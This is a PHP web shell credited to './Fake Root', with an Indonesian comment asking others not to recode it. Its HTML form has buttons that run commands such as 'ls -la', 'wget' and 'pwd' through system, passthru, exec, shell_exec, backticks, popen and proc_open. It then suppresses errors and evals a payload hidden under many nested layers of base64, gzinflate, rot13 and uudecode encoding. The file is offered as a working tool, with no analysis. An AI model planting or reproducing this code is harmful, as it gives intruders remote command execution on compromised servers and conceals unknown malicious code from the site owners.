<!-- ./Fake Root -->
<!-- jangan di recode boss, susah gw bikin nya -->

<html>
<body>
<font color=red face=courier new size=5><i><b>Random command execute by ./Fake Root</font></i><br><br><font color="black" size="4">
<form method="post">
system =>
<input type="submit" name="sys" value="ls -la"> <input type="submit" name="syst" value="wget"> <input type="submit" name="syste" value="pwd"><br><br>

passthru =>
<input type="submit" name="ps" value="ls -la"> <input type="submit" name="pst" value="wget"> <input type="submit" name="pstr" value="pwd">
<br><br>

exec =>
<input type="submit" name="ex" value="ls -la"> <input type="submit" name="exe" value="wget"> <input type="submit" name="exec" value="pwd"><br><br>

shell exec =>
<input type="submit" name="ex1" value="ls -la"> <input type="submit" name="exe1" value="wget"> <input type="submit" name="exec1" value="pwd"><br><br>

backticks =>
<input type="submit" name="bc" value="ls -la"> <input type="submit" name="bct" value="wget"> <input type="submit" name="bctk" value="pwd">

<br><br>
popen =>
<input type="submit" name="p" value="ls -la"> <input type="submit" name="po" value="wget"> <input type="submit" name="pop" value="pwd">

<br><br>
proc_open =>
<input type="submit" name="e" value="ls -la"> <input type="submit" name="pr" value="wget"> <input type="submit" name="pon" value="pwd">
</form>

<?php /* ./Fake Root Was Here */ 
@ini_set(‘output_buffering’,0); 
@ini_set(‘display_errors’, 0);

$heker ="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";

@eval(base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode($heker))))))))))));
exit;
?>
